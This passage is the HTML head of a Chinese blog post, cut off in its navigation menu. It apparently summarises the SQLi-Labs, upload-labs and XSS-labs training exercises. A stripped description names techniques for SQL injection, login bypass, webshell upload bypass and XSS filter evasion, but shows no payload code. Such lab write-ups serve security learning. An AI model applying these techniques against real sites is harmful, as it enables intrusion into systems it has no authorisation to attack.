<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>常规漏洞学习总结 | hybcx</title><meta name="keywords" content="基本知识"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="常规漏洞学习总结"><meta name="application-name" content="常规漏洞学习总结"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="常规漏洞学习总结"><meta property="og:url" content="http://hybcx.xyz/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 SQLi_Lab Less-1 关键源码如下： &amp;lt;?php include(&amp;quot;..&amp;#x2F;sql-connections&amp;#x2F;sql-connect.php&amp;quot;); error_reporting(0); &amp;#x2F;&amp;#x2F; take the variables  if(isset($_GET[&amp;#39;id&amp;#39;]))"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 SQLi_Lab Less-1 关键源码如下： &amp;lt;?php include(&amp;quot;..&amp;#x2F;sql-connections&amp;#x2F;sql-connect.php&amp;quot;); error_reporting(0); &amp;#x2F;&amp;#x2F; take the variables  if(isset($_GET[&amp;#39;id&amp;#39;]))"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '常规漏洞学习总结',
  postAI: '',
  pageFillDescription: '0x01 SQLi_Lab, Less-1, 联合注入, 报错注入, 布尔盲注, 时间盲注, sqlmap, Less-2, Less-3, Less-4, Less-5, Less-6, Less-7, 盲注, 导出数据到文件, Less-8, Less-9, Less-10, Less-11, 万能密码, 联合注入, 报错注入, 布尔盲注, 时间盲注, sqlmap, Less-12, Less-13, Less-14, Less-15, 0x02 upload-labs, Pass-01, 前端禁用js, bp抓包, Pass-02, Pass-03, Pass-04, Pass-05, Pass-06, Pass-07, Pass-08, Pass-09, Pass-10, Pass-11, Pass-12, Pass-13, Pass-14, Pass-15, Pass-16, Pass-17, Pass-18, Pass-19, Pass-20, Pass-21, 0x03 Xss-lab, level-1, level-2, level-3, level-4, level-5, level-6, level-7, level-8, level-9, level-10, level-11, level-12, level-13, level-14, level-15, level-16, level-17, level-18, level-19, level-20, 0x04 参考文章关键源码如下可以看到这里为类型传参且传入的参数没有经过任何过滤便插入到了语句中且可以清晰看到闭合方式为单引号另外值得注意的是这里用了函数来显示数据库可能的报错信息这意味着我们可以进行联合报错布尔时间盲注联合注入报错注入手动修改进行结果偏移布尔盲注时间盲注联合注入报错注入布尔盲注延时盲注关键代码如下与上一关类似只不过参数这次为数字类型闭合方式不一样而已不在赘述了关键代码如下同样的这次闭合方式为单引号括号其余不变也是相同道理不过在插入语句之前对参数内容进行了双引号的拼接看似复杂其实就是将闭合方式换为了双引号括号关键代码如下这里的闭合方式换为了单引号闭合但是与之前四关不同的是这一关不能采用联合注入了因为代码中不会输出有关查询结果的信息关键代码如下与类似只是更换闭合方式为双引号了关键代码如下这里又进行了变动首先是闭合方式改为了单引号双括号方式其次将注释掉了这意味着我们不能进行联合注入与报错注入只能进行时间和布尔盲注可以手工验证后直接跑盲注布尔盲注时间盲注导出数据到文件根据上述作者的提示我们尝试将数据库数据导入到文件进行读取在此之前我们先看一下数据库环境变量的值为表示限制不允许导入导出当的值为表示限制的导入导出只能发生在目录下当的值为空时表示不对的导入导出做限制可见我们这里是空的因此可以进行导入导出这里我们可以指定导出路径当然我这里是下如果在下不指定路径则默认的导出路径为这里也可以看到导出成功但一般这种情况下如果我们可以向目录写文件的时候通常是直接写可以看到写入成功与类似只不过闭合方式改为了单引号闭合这一关也进行了较为明显的改动那就是无论执行语句之后是否成功页面回显情况都一致这意味着我们只能进行时间盲注与类似但参数闭合方式改为了双引号这一关整体框架如同一般只不过注入点发生在了表单处也就是型注入看代码可以发现这里对与参数没有进行任何检查万能密码一般这种表单处最简单的漏洞就是万能密码的利用了而这里也是存在的可以看到成功进入且不需要输入正确的密码其余类似构造如下注释掉来登录注释后面语句并添加一个永真条件闭合后面语句并添加一个永真条件联合注入报错注入错误例子正确例子正确例子这里本想着继续尝试的报错方式但这里似乎并不支持找了诸多文章发现大概是中的数字问题这里的数据库似乎不支持这种方式的意思是指定某一列而这里如果不添加的语句则会成功报错布尔盲注时间盲注直接拿出抓到的数据保存为即可然后直接使用的参数来加载这个请求包也可以手动通过来对的数据包内容进行注入检测实际上比较鸡肋操作效率比较低联合注入报错注入布尔盲注时间盲注与上一关类似不过闭合方式改为了双引号括号的方式由于这里将查询结果的输出注释掉了意味着我们无法进行联合注入并且闭合方式改为了单引号括号与类似只是闭合方式改为了双引号闭合注释掉了函数这意味着我们只能进行布尔和时间盲注了同时闭合方式为单引号请选择要上传的文件定义允许上传的文件类型提取上传文件的类型判断上传文件类型是否允许上传该文件不允许上传请上传类型的文件当前文件类型为可以看到关键的参数是从前端提取到的如果为指定的上述三种类型则可以成功上传如果不是指定类型则会有个弹窗所有的操作都是在前端进行的也就是说如果我们能绕过前端检验直接进行后端就可以上传任意文件了因为后端并没有进行任何检查这里绕过方式可以是前端禁用或者抓包进入后端前端禁用这里用禁用上传即可验证成功抓包首先上传一个后缀正确的文件之后抓包随后修改后缀为如下图上传成功上传出错文件类型不正确请重新上传文件夹不存在请手工创建这里看到代码对文件做出了限制我们百度很容易搜到这样的信息显示客户端文件的原名称文件的类型例如已上传文件的大小单位为字节储存的临时文件名一般是系统默认该文件上传的代码版本后增加的因此我们修改类型即可绕过删除文件名末尾的点转换为小写去除字符串收尾去空上传出错不允许上传后缀文件文件夹不存在请手工创建这里对上传的文件后缀进行了黑名单的过滤但我们可以使用一些畸形不常见的后缀名进行绕过如等畸形后缀名前提条件即的有配置代码我们可以进入配置文件查看一下那这里直接上传这里剩下的三个后缀即可绕过成功上传删除文件名末尾的点转换为小写去除字符串收尾去空上传出错此文件不允许上传文件夹不存在请手工创建这里可以看到黑名单过滤的更多了能过滤的几乎都过滤了但却没有过滤与后缀而这里用到的是文件或者分布式配置文件全称是超文本入口提供了针对目录改变配置的方法即在一个特定的文档目录中放置一个包含一个或多个指令的文件以作用于此目录及其所有子目录作为用户所能使用的命令受到限制管理员可以通过的指令来设置启用需要修改启用并可以用限制特定命令的使用如果需要使用以外的其他文件名可以用指令来改变例如需要使用则可以在服务器配置文件中按以下方法配置它里面有这样一段代码我们把改成可以帮我们实现包括文件夹密码保护用户自动重定向自定义错误页面改变你的文件扩展名封禁特定地址的用户只允许特定地址的用户禁止目录列表以及使用其他文件作为文件等一些功能首先写一个内容如下他会将后缀名为的文件当作文件解析于是我们将木马文件后缀名改为即可或上传成功删除文件名末尾的点转换为小写去除字符串首尾去空上传出错此文件类型不允许上传文件夹不存在请手工创建可以看到过滤了但我们可以利用后缀是的配置文件中的字段也会被视为配置文件来处理从而导致的文件解析漏洞但是想要引发解析漏洞需要三个前提条件服务器脚本语言为已满足服务器使用模式上传目录下要有可执行的文件已满足首先调整为模式切换版本中切换到创建一个文件文件里的意思是所有的文件都自动包含文件相当于一个用户自定义的首先上传文件里的意思是所有的文件都自动包含文件相当于一个用户自定义的首先上传在上传会发现解析图片错误是因为只有在访问文件时才会自动包含所以作者给了提示在上传目录下是有一个文件的所以直接访问此文件就可以包含上传的了因为会自动包含那么文件里面的内容就会被当做代码而执行我们只需要在包含的文件写上一句话木马即可接下来如果直接上传之后如果你想直接访问该文件会报错这是因为只有在访问文件的时候才会自动包含根据提示我们知道上传目录下存在文件上传木马后我们进入上传目录访问文件即可上传成功删除文件名末尾的点去除字符串首尾去空上传出错此文件类型不允许上传文件夹不存在请手工创建这里看到又过滤了后缀但这里却忘记过滤大小写了修改后缀名为即可删除文件名末尾的点转换为小写去除字符串上传出错此文件不允许上传文件夹不存在请手工创建与上一关对比发现没有过滤空格我们在后缀添加空格即可绕过转换为小写去除字符串首尾去空上传出错此文件类型不允许上传文件夹不存在请手工创建对比发现这里没有删除文件末尾的点我们在后面添加即可删除文件名末尾的点转换为小写首尾去空上传出错此文件类型不允许上传文件夹不存在请手工创建对比发现这一关没有过滤具体的含义可以参考在文件解析漏洞中的妙用属性可以被恶意攻击者利用来隐藏恶意代码或数据这种漏洞通常发生在应用程序或操作系统对文件解析和处理的过程中攻击者通过构造特定的文件名或路径使得应用程序在解析文件时错误地将属性作为文件名的一部分从而导致恶意代码或数据被执行或读取在的情况下如果文件名会把之后的数据当成文件流处理不会检测后缀名且保持之前的文件名利用特性可在后缀名中加绕过这里我们在上传文件后缀添加即可上传之后访问即可属性对于普通用户来说是隐藏的通常只有系统和一些特定的程序才能访问和使用它对于普通用户来说文件的数据是通过文件名来访问和操作的而不需要直接访问属性删除文件名末尾的点转换为小写去除字符串首尾去空上传出错此文件类型不允许上传文件夹不存在请手工创建这一关涉及到了函数特性函数从后向前检测当检测到末尾的第一个点时会继续它的检测但是遇到空格会停下来我们利用该函数的特性修改后缀名为这样最终执行完的结果为成功绕过我们进行抓包验证上传出错文件夹不存在请手工创建重点观察即可知道双写绕过即可上传出错只允许上传类型文件这关查看源码发现对上传格式做了限制这时想要绕过需要例如我们上传时首先后缀名是合法的格式可以绕过前端的检测上传到后端后后端判断文件名后缀的函数会认为其是一个格式的文件可以躲过白名单检测但是在保存文件时保存文件时处理文件名的函数在遇到字符认为这是终止符于是丢弃后面的于是我们上传的文件最终会被写入文件中并存储在服务端并且关闭文件上传路径可控上传失败只允许上传类型文件与上一关类似只不过这一关是在上面进行截断注意当中的参数是通过方式获取时会被自动解码而当参数是通过方式获取时是不会自动解码的也就是说只会原样被当成字符串来输出所以通过方式请求此类参数的时候我们需要手动将它的十六进制改写为只读字节文件未知上传失败上传出错这一关的校验代码通过读文件的前个字节判断文件类型因此直接上传图片马即可制作图片马图片文件名一句话木马文件名制作的图片马文件名制作好打开之后如下图说明制作成功接下来我们用它的自带的文件包含漏洞解析该图片文件未知上传失败上传出错这一关采用了函数校验对目标文件的进制去进行一个读取去读取头几个字符串是不是符合图片的要求的同上一关步骤一样当然也可以直接抓包在文件内容前面添加指定类型的文件头如等等需要开启模块文件未知上传失败上传出错这一关采用了函数来校验读取一个图像的第一个字节并检查其后缀名返回值与函数返回的索引相同但是速度比快得多需要开启模块与上一关步骤相同获得上传文件的基本信息文件名类型大小临时文件路径获得上传文件的扩展名判断文件后缀与类型合法才进行上传操作使用上传的图片生成新的图片该文件不是格式的图片给新图片指定文件名显示二次渲染后的图片使用用户上传图片生成的新图片上传出错使用上传的图片生成新的图片该文件不是格式的图片给新图片指定文件名显示二次渲染后的图片使用用户上传图片生成的新图片上传出错使用上传的图片生成新的图片该文件不是格式的图片给新图片指定文件名显示二次渲染后的图片使用用户上传图片生成的新图片上传出错只允许上传后缀为的图片文件补充知识二次渲染后端重写文件内容没指定则返回后缀名有则不返回指定的后缀名函数查找字符串在另一个字符串中最后一次出现的位置并返回从该位置到字符串结尾的所有字符创建一块画布并从文件或地址载入一副图像创建一块画布并从文件或地址载入一副图像创建一块画布并从文件或函数相当于创建一个新图像函数删除文件前面的表示不显示可能出现的错误函数用于获取变量的字符串值函数以格式将图像输出到浏览器或文件总结如果我们上传的是图像这里会重新生成一个图像并且随机文件名在返回图像到浏览器后就删除图像也就是二次渲染关于绕过的二次渲染我们只需要找到渲染前后没有变化的位置然后将代码写进去就可以成功上传带有代码的图片了我们可以依旧制作图片马接着上传之后将服务器上的最终的图片马下载下来两者对比在内容没有发生变化的地方添加一句话木马即可只允许上传类型文件上传出错这里可以上传图片马也有条件竞争注意关键函数函数由于这里的代码逻辑是不论什么文件先上传后判断接着如果文件后缀不符合规定再决定是否删除但如果我们在文件删除之前就读取到该文件那文件就不能被正常删除了直接上传使用拦截如上图进行修改后我们先正常上传图片复制以下图片的路径方便后续的访问在开始之后我们不断的去访问上传的文件即可文件已经被上传但没有重命名这个文件不能上传到服务器的临时文件存储目录上传失败上传目录不可写上传失败无法上传该类型文件上传失败上传的文件过大上传失败服务器已经存在相同名称文件文件无法上传文件不能复制到目标目录未知错误分析本做了白名单校验文件上传后先保存在对象中随后对文件进行判断存在检查扩展名检查大小重命名移动操作没有判断文件头和二次渲染我们可以使用图片木马配合文件包含漏洞进行绕过虽然进行了移动和重命名但是网页会回显地址上传随后使用文件包含漏洞访问该文件上传出错禁止保存为该类型文件文件夹不存在请手工创建函数以数组的形式返回关于文件路径的信息返回的数组元素如下目录路径文件名文件后缀名不包含后缀的文件名这一关只检查了文件后缀名且没有限制大小写很容易绕过这关也可以直接利用文件包含漏洞上传图片马利用截断绕过注意版本有这么一个特性会忽略掉文件末尾的可以在后缀名添加即可绕过黑名单检查禁止上传该类型文件检查文件名禁止上传该后缀文件文件上传成功文件上传失败请选择要上传的文件关键函数函数返回数组中元素的数目函数将内部指针指向数组中的第一个元素并输出函数将内部指针指向数组中的最后一个元素并输出函数使用一个字符串分割另一个字符串并返回由字符串组成的数组这关可以直接修改类型为白名单中的某一个放包上传然后利用文件包含漏洞进行验证即可审计代码这关的关键部分为判断是否是一个数组不是数组必定会经历打散为数组的过程而最终的文件名后缀取的是因此我们可以让为数组设置为而设置为也就是白名单中的某一个为空这样最终结果为后缀名为由于函数的判断而为空为经过的特性最终上传为上传成功欢迎来到欢迎来到欢迎用户的长度可以看到代码会接受一个传参且对内容没有任何过滤我们直接插入代码即可欢迎来到没有找到和相关的结果搜索的长度代码对传入参数作了的过滤但是在标签处没有设计过滤我们只需要正常闭合插入代码即可欢迎来到没有找到和相关的结果搜索的长度这一关对与标签处都做了特殊字符转义转义字符如下注意这里的单引号似乎是不被过滤的我们使用即可那之后的思路就是找一个不需要事件标签欢迎来到没有找到和相关的结果搜索的长度这里虽然对传入的参数过滤了但我们只需借用上一关的即可欢迎来到没有找到和相关的结果搜索的长度这里看到在标签处只是针对关键词进行了过滤我们只需要使用不包含上述关键词的即可没有找到和相关的结果搜索的长度与上一关对比可以发现增加了过滤关键词等但却忘记大小绕过了没有找到和相关的结果搜索的长度与上一关比较虽然限制了大小写的绕过但对于关键词的过滤采用的替换为空这意味着我们双写绕过即可添加友情链接友情链接的长度虽然这里过滤的很全但我们关注即可发现这里已经为我们写好了那我们只需要想办法构造代码即可由于双引号被过滤这意味着我们写入的肯定会被当做字符串但我们正好就可以利用这个特性在中对于属性浏览器会对其中的内容进行自动解码这意味着实体编码会在解析过程中被还原为原始字符这就是为什么在你提供的例子中即使插入了实体编码最终仍然被解释为代码的原因那我们直接构造即可实体编码后之后输入到输入框中即可添加友情链接您的链接不合法有没有友情链接友情链接的长度实体编码后没有找到和相关的结果的长度熟悉的过滤重点关注参数即可这里在经过两个简单校验之后就直接插入到了事件标签中绕过原理很容易知道但是这里的确实我们可以直接手动除掉当然也可以直接手动构造没有找到和相关的结果的长度这里的与都进行了有效过滤但关注会发现没有任何过滤直接修改即可修改头即可没有找到和相关的结果的长度与上一关类似只不过注入点在头不再赘述没有找到和相关的结果的长度依旧老套路注入点在处这题环境有问题就直接看网上的思路了漏洞是一种安全漏洞存在于图片的数据中数据是嵌入在数字图像文件中的元数据包含有关图像的信息如拍摄日期相机型号坐标等浏览器和其他应用程序通常会解析和显示这些数据当存在漏洞时攻击者可以在图像的数据中插入恶意的代码当用户加载带有恶意数据的图像时浏览器或其他应用程序可能会错误地解析恶意代码并在受害者的浏览器上执行它脚本如下打开图像文件初始获取图像的数据将数据转为可修改的字典格式修改数据语句语句将修改后的数据重新写回图像改后之后思路就是先修改标签接着上传图片加载即可具体可参考网络安全解题详析可以看到这里有一个属性我们简单了解一下这题考察的用法具体可以参考这篇资料指令指令用于包含外部的文件包含的内容将作为指定元素的子节点属性的值可以是一个表达式返回一个文件名默认情况下包含的文件需要包含在同一个域名下所以这里就用来包含其他关的页面来触发弹窗特别值得注意的几点如下如果单纯指定地址必须要加引号加载外部标签中的内容不执行加载外部中含有标签样式可以识别的长度这里过滤掉了标签可以尝试使用其他标签通过事件来弹窗但是也过滤了空格可以使用如下符号替代空格符号编码回车换行总的来说标签就是引入一个文件到浏览器端并且它的属性值没有添加引号所以不用闭合但这里需要用支持插件的浏览器才可以回显区域大家可以下载或者去后台修改引入的文件如如下图没什么变化用上一关的即可跟前几关差不多但加了双引号来闭合但很明显有实体化函数我们无法闭合双引号参考与漏洞详解是指针对使用技术开发的应用程序的跨站脚本攻击是一种用于创建富媒体和互动内容的广泛使用的技术将恶意文件嵌入到受信任的网页中当用户访问包含恶意文件的页面时文件会在用户的浏览器中执行这关用到的是注入其实就是往里面插入一段代码然后手动执行嘛构造同上一关一样有双引号还是要插入代码参考文章关于报错注入你真的懂了吗基础汇总从零开始文件上传绕过姿势整理文件上传绕过思路总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-02-03 12:02:52',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a 